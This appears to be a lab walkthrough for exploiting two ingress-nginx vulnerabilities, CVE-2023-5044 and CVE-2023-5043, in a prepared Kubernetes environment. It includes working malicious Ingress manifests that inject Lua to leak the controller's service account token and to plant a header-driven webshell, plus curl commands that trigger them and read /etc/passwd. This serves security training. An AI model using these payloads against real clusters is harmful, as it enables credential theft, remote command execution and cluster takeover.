# Abusing CVE-2023-5044 and CVE-2023-5043

This scenario prepare the environment so you can exploit CVE-2023-5044 and CVE-2023-5043. These exploits abuse some of the Kubernetes Nginx ingress controller features to inject code using annotations, these vulnerabilities were fixed in the 1.9.0 version.

The ingress controller is installed as a NodePort service (To avoid the need of an external load balancer), its ports are:
- 30080 for HTTP
- 30443 for HTTPS

A pod you can SSH into is provided, the service account used by the pod has limited privileges but are enough to exploit the vulnerabilities. The idea is to emulate a scenario where an application that manage the Ingress objects is compromised:

```bash
ssh pwned@10.10.20.2 -p 30023
```

The service account has only **read access to services and pods but full access to ingress objects**.

Once connected, prepare the `kubectl` binary so you can make request to the Kubernetes API in an easy way:

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
```

If you did everything right, this command should return all the pods in the cluster:

```bash
./kubectl --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server https://10.10.20.2:6443 --insecure-skip-tls-verify=true get pods -A
```

From here, you can continue reading for a guided exploitation or research for yourself. At the end of this document you can find some really interesting references to understand the vulnerabilities.

# CVE-2023-5044

The provided PoC will leak the Nginx controller service account token instead of provide a webshell. This token has access to a lot of resources including secrets so in most cases you may abuse this to escalate and get full access to the cluster.

First deploy this malicious Ingress copying it to a file and using:

```bash
./kubectl --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server https://10.10.20.2:6443 --insecure-skip-tls-verify=true apply -f ingress.yaml
```

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: cve-2023-5044
  namespace: cve-2023-5044-and-cve-2023-5043
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /$2
    nginx.ingress.kubernetes.io/permanent-redirect: https://www.google.com;}location ~* "^/exploit(/|$)(.*)" {content_by_lua 'ngx.say(io.popen("cat /var/run/secrets/kubernetes.io/serviceaccount/token"):read("*a"))';}location ~* "^/exploit(/|$)(.*)" { content_by_lua 'os.execute("touch /you")'
spec:
  rules:
  - http:
      paths:
      - pathType: Prefix
        path: /foo(/|$)(.*)
        backend:
          service:
            name: foo-service
            port:
              number: 5678
      - pathType: Prefix
        path: /test(/|$)(.*)
        backend:
          service:
            name: test-service
            port:
              number: 5678
```

Once the above is done, execute this to get the Nginx controller service account token:

```bash
curl http://10.10.20.2:30080/exploit
```

# CVE-2023-5043:

In order for this to work the `allow-snippet-annotations` option needs to be set to `true`. This option was defaulted to `true` until v1.9.0, what means that previous versions are mostly vulnerable if the administrator did not mitigated the problem and later versions could be vulnerable if the `allow-snippet-annotations` was re-enabled for some reason. Also, if you have enough privileges to play with the Nginx controller ConfigMap, you can enable the `allow-snippet-annotations` option yourself!

The exploitation of this vulnerability is pretty similar to CVE-2023-5044. In this case, the PoC provided will give you a webshell. Deploy this malicious Ingress copying it to a file and using:

```bash
./kubectl --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server https://10.10.20.2:6443 --insecure-skip-tls-verify=true apply -f ingress.yaml
```

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: cve-2023-5043
  namespace: cve-2023-5044-and-cve-2023-5043
  annotations:
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_headers "pwned"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /pwned/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
spec:
  rules:
  - host: pwned.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: test-service
            port:
              number: 5678
```

Now you can start executing commands in the Nginx controller pod. The example command will return the contents of the `/etc/passwd` file:

```bash
curl -v -H 'Host: pwned.me' -H "cmd: cat /etc/passwd" http://10.10.20.2:30080/pwned/
```

## References

- https://kubernetes.io/docs/concepts/services-networking/ingress/
- https://www.covertswarm.com/post/exploiting-cve-2023-5044-and-cve-2023-5043-to-overtake-a-kubernetes-cluster
- https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#allow-snippet-annotations
- https://github.com/r0binak/CVE-2023-5044
- https://github.com/KubernetesBachelor/CVE-2023-5044
- https://github.com/r0binak/CVE-2023-5043
- https://www.armosec.io/blog/cve-2023-5043-nginx-ingress/
